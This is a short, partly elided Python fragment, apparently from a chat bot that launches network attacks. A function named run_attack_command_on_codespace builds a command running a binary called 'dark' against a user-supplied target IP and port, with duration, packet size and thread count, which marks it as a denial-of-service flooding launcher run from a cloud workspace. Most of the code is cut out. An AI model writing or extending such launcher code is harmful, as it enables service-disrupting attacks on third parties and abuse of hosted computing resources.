import sys
sys.path.insert(0, "/home/dark/py-packages")
import time
import logging
import json
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command =f"./home/user/myapp/freeroot/root/heloooooooo/dark {target_ip} {target_port} {duration} {packet_size} {thread_count}"
